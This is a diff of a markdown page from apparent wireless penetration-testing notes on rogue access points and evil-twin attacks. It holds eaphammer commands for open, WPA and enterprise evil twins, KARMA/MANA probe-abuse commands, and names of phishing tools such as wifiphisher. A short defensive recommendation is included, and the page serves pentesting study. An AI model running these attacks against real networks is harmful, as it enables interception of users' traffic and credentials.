@@ -1,10 +1,10 @@
-## Open Network Impersonation (Client Attacks)
+# Open Network Impersonation (Client Attacks)
 An attacker discovered an open network that is currently in use. Open networks pose a significant security risk due to their lack of integrity assurance. An attacker can impersonate the open network, luring users into the attacker's network. An attacker can also conduct a DoS attack against the corporate network, which will cause the targeted devices to seek out alternative networks to connect to, leading the victim devices to connect to the attacker's imposter network. A Rogue AP refers to an access point installed on a secure network without the explicit permission of a system administrator. Such devices can pose a severe security threat, as anyone accessing the premises may inadvertently or intentionally install a low-cost wireless AP, allowing unauthorized parties to access the network. 
 
 Recommendation:
 To compensate for the lack of Layer 2 security, organizations need to implement more robust defenses at the upper layers. One way to limit the SSIDs that client devices connect to is by utilizing Group Policy functions and forbidding the connection to the 'ANY' SSID. By doing so, end-users won't be able to connect to wireless networks that are not considered trustworthy. Educating users on the significance of confirming the identity of digital certificates before supplying sensitive information, ensuring that the root or issuing authority for the digital certificate is trusted.
 
-### Rogue AP Process:
+## Rogue AP Process:
 
     1. Check whether SSID is Visible or not
     2. Sniff for IP range if SSID is visible then check the status of MAC Filtering.
@@ -18,7 +18,7 @@ To compensate for the lack of Layer 2 security, organizations need to implement 
 ### Open Network Evil Twin
     $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID>
      
-     Could use the following tools: airgeddon.sh, fluxion.sh, wifipumpkin3
+Could use the following tools: airgeddon.sh, fluxion.sh, wifipumpkin3
 
 ### WPA/WPA2-Personal Evil Twin
    WPA Passphrase Known:
@@ -51,16 +51,18 @@ To compensate for the lack of Layer 2 security, organizations need to implement 
     $ eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap \ --essid <SSID_corporate_wifi>
 
 ### 802.11 Network Selection Algorithms Abuse (for Open Network)
-    Abuse clients' passive scanning with known Beacons Attack:
-        $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana –known-beacons
 
-    Abuse clients' active probing:
+Abuse clients passive scanning with known Beacons Attack:
+            
+    $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana –known-beacons
+
+Abuse clients active probing:
+
+    # KARMA Attack (outdated) By default with wifiphisher  
+    $ sudo wifiphisher
     
-      # KARMA Attack (outdated) By default with wifiphisher
-        $ sudo wifiphisher
-        
-      # MANA Attack (KARMA improvement)
-        $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana
-        
-      # Loud MANA (MANA Improvement) 
-        $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana –loud
+    # MANA Attack (KARMA improvement)    
+    $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana
+    
+    # Loud MANA (MANA Improvement) 
+    $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana –loud
